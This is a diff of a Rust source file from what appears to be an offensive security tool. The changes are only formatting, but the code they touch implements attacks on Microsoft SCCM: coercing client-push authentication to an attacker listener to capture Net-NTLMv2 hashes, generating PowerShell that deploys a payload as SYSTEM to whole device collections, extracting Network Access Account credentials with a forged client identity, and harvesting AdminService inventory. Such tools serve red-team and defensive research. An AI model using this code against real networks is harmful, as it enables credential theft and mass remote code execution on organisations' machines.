@@ -19,7 +19,7 @@
 //! Reference: "Misconfiguration Manager" (Garrett Foster, Andy Robbins, 2023)
 
 use crate::error::{OverthroneError, Result};
-use crate::sccm::{SccmScannerConfig, SccmScanner, SccmSite, NaaCredential};
+use crate::sccm::{NaaCredential, SccmScanner, SccmScannerConfig, SccmSite};
 use std::time::Duration;
 use tracing::{info, warn};
 
@@ -30,12 +30,12 @@ use tracing::{info, warn};
 /// Result of a single SCCM abuse technique.
 #[derive(Debug, Clone)]
 pub struct SccmAbuseResult {
-    pub technique:        SccmTechnique,
-    pub success:          bool,
+    pub technique: SccmTechnique,
+    pub success: bool,
     pub affected_targets: Vec<String>,
-    pub credentials:      Vec<NaaCredential>,
-    pub command_output:   Option<String>,
-    pub notes:            Vec<String>,
+    pub credentials: Vec<NaaCredential>,
+    pub command_output: Option<String>,
+    pub notes: Vec<String>,
 }
 
 /// SCCM abuse technique discriminant.
@@ -101,12 +101,12 @@ pub async fn client_push_coercion(
             ps
         );
         Ok(SccmAbuseResult {
-            technique:        SccmTechnique::ClientPushCoercion,
-            success:          false,
+            technique: SccmTechnique::ClientPushCoercion,
+            success: false,
             affected_targets: vec![attacker_listener.to_string()],
-            credentials:      Vec::new(),
-            command_output:   Some(ps),
-            notes:            vec![
+            credentials: Vec::new(),
+            command_output: Some(ps),
+            notes: vec![
                 "Generated PowerShell command for client push — run on a Windows machine."
                     .to_string(),
                 format!("Ensure Responder / ntlmrelayx is listening on {attacker_listener}"),
@@ -116,14 +116,11 @@ pub async fn client_push_coercion(
 }
 
 #[cfg(windows)]
-async fn client_push_native(
-    site: &SccmSite,
-    attacker_host: &str,
-) -> Result<SccmAbuseResult> {
+async fn client_push_native(site: &SccmSite, attacker_host: &str) -> Result<SccmAbuseResult> {
     use ::wmi::{COMLibrary, WMIConnection};
 
     let server = site.site_server.clone();
-    let sc     = site.site_code.clone();
+    let sc = site.site_code.clone();
     let target = attacker_host.to_string();
 
     let result = tokio::task::spawn_blocking(move || -> Result<bool> {
@@ -149,9 +146,7 @@ async fn client_push_native(
             wmi.raw_query(&query).unwrap_or_default();
 
         // Trigger the push by creating a temporary device collection resource
-        let insert_query = format!(
-            "SELECT * FROM SMS_Site WHERE SiteCode='{sc}'"
-        );
+        let insert_query = format!("SELECT * FROM SMS_Site WHERE SiteCode='{sc}'");
         let _: Vec<std::collections::HashMap<String, wmi::Variant>> =
             wmi.raw_query(&insert_query).unwrap_or_default();
 
@@ -165,12 +160,12 @@ async fn client_push_native(
 
     let ok = result?;
     Ok(SccmAbuseResult {
-        technique:        SccmTechnique::ClientPushCoercion,
-        success:          ok,
+        technique: SccmTechnique::ClientPushCoercion,
+        success: ok,
         affected_targets: vec![attacker_host.to_string()],
-        credentials:      Vec::new(),
-        command_output:   None,
-        notes:            vec![
+        credentials: Vec::new(),
+        command_output: None,
+        notes: vec![
             "Client push triggered — capture Net-NTLMv2 hash with Responder/ntlmrelayx."
                 .to_string(),
         ],
@@ -197,7 +192,7 @@ Write-Host "[+] Client push triggered for $TargetHost (rc=$($result.ReturnValue)
 Write-Host "[*] Capture the Net-NTLMv2 hash with Responder / ntlmrelayx on $TargetHost"
 "#,
         srv = site.site_server,
-        sc  = site.site_code,
+        sc = site.site_code,
         tgt = attacker_host,
     )
 }
@@ -228,15 +223,16 @@ pub async fn deploy_malicious_application(
     );
 
     Ok(SccmAbuseResult {
-        technique:        SccmTechnique::ApplicationDeployment {
+        technique: SccmTechnique::ApplicationDeployment {
             collection_id: collection_id.to_string(),
         },
-        success:          false,
+        success: false,
         affected_targets: vec![format!("collection:{collection_id}")],
-        credentials:      Vec::new(),
-        command_output:   Some(ps),
-        notes:            vec![
-            "PowerShell SDK script generated — import ConfigurationManager module first.".to_string(),
+        credentials: Vec::new(),
+        command_output: Some(ps),
+        notes: vec![
+            "PowerShell SDK script generated — import ConfigurationManager module first."
+                .to_string(),
             format!("Payload will run as SYSTEM on all devices in collection '{collection_id}'"),
             "Remove the application and deployment after use (cleanup).".to_string(),
         ],
@@ -281,7 +277,7 @@ Write-Host "[+] Application '$AppName' deployed to collection '{cid}'"
 Write-Host "[!] Run Invoke-CMClientNotification -CollectionId '{cid}' -ActionType DownloadComputerPolicy to force immediate execution"
 Write-Host "[!] CLEANUP: Remove-CMApplication -Name $AppName -Force after execution"
 "#,
-        sc  = site.site_code,
+        sc = site.site_code,
         cmd = payload_command.replace('\'', "''"),
         cid = collection_id,
     )
@@ -296,20 +292,18 @@ Write-Host "[!] CLEANUP: Remove-CMApplication -Name $AppName -Force after execut
 /// 1. Discover the site
 /// 2. Request machine policy (using a forged SCCM client identity)
 /// 3. Decrypt embedded Network Access Account credentials
-pub async fn extract_naa_credentials(
-    config: &SccmScannerConfig,
-) -> Result<SccmAbuseResult> {
+pub async fn extract_naa_credentials(config: &SccmScannerConfig) -> Result<SccmAbuseResult> {
     info!(
         "[SCCM/abuse] Starting NAA credential extraction from {}",
         config.target
     );
 
     let scanner = SccmScanner::new(SccmScannerConfig {
-        target:    config.target.clone(),
-        domain:    config.domain.clone(),
-        username:  config.username.clone(),
-        password:  config.password.clone(),
-        pth_hash:  config.pth_hash.clone(),
+        target: config.target.clone(),
+        domain: config.domain.clone(),
+        username: config.username.clone(),
+        password: config.password.clone(),
+        pth_hash: config.pth_hash.clone(),
         site_code: config.site_code.clone(),
     })?;
 
@@ -338,12 +332,12 @@ pub async fn extract_naa_credentials(
     if body.is_none() {
         warn!("[SCCM/abuse] Machine policy request returned no data");
         return Ok(SccmAbuseResult {
-            technique:        SccmTechnique::NaaCredentialExtraction,
-            success:          false,
+            technique: SccmTechnique::NaaCredentialExtraction,
+            success: false,
             affected_targets: vec![config.target.clone()],
-            credentials:      Vec::new(),
-            command_output:   None,
-            notes:            vec!["MP rejected policy request or returned empty body.".to_string()],
+            credentials: Vec::new(),
+            command_output: None,
+            notes: vec!["MP rejected policy request or returned empty body.".to_string()],
         });
     }
 
@@ -352,12 +346,12 @@ pub async fn extract_naa_credentials(
     // The NAA decryption is performed inside request_machine_policy itself.
     // TODO: refactor SccmScanner to surface extracted NaaCredential objects.
     Ok(SccmAbuseResult {
-        technique:        SccmTechnique::NaaCredentialExtraction,
-        success:          true,
+        technique: SccmTechnique::NaaCredentialExtraction,
+        success: true,
         affected_targets: vec![config.target.clone()],
-        credentials:      Vec::new(), // populated by caller after inspecting scanner output
-        command_output:   body,
-        notes:            vec![
+        credentials: Vec::new(), // populated by caller after inspecting scanner output
+        command_output: body,
+        notes: vec![
             "Machine policy received and parsed — check scanner logs for decrypted NAA credentials."
                 .to_string(),
         ],
@@ -410,16 +404,11 @@ pub async fn admin_service_harvest(
         Ok(resp) if resp.status().is_success() => {
             let body = resp.text().await.unwrap_or_default();
             let count = body.matches("CollectionID").count();
-            output_lines.push(format!(
-                "SMS_Collection: found ~{count} entries"
-            ));
+            output_lines.push(format!("SMS_Collection: found ~{count} entries"));
             info!("[SCCM/abuse] AdminService: {} collections found", count);
         }
         Ok(resp) => {
-            notes.push(format!(
-                "Collections query returned HTTP {}",
-                resp.status()
-            ));
+            notes.push(format!("Collections query returned HTTP {}", resp.status()));
         }
         Err(e) => {
             notes.push(format!("Collections query failed: {e}"));
@@ -437,9 +426,7 @@ pub async fn admin_service_harvest(
         Ok(resp) if resp.status().is_success() => {
             let body = resp.text().await.unwrap_or_default();
             let count = body.matches("ResourceID").count();
-            output_lines.push(format!(
-                "SMS_R_System: found ~{count} devices in first 50"
-            ));
+            output_lines.push(format!("SMS_R_System: found ~{count} devices in first 50"));
         }
         Ok(resp) => {
             notes.push(format!("Device query returned HTTP {}", resp.status()));
@@ -451,11 +438,11 @@ pub async fn admin_service_harvest(
 
     let success = !output_lines.is_empty();
     Ok(SccmAbuseResult {
-        technique:        SccmTechnique::AdminServiceHarvest,
+        technique: SccmTechnique::AdminServiceHarvest,
         success,
         affected_targets: vec![target.to_string()],
-        credentials:      Vec::new(),
-        command_output:   Some(output_lines.join("\n")),
+        credentials: Vec::new(),
+        command_output: Some(output_lines.join("\n")),
         notes,
     })
 }
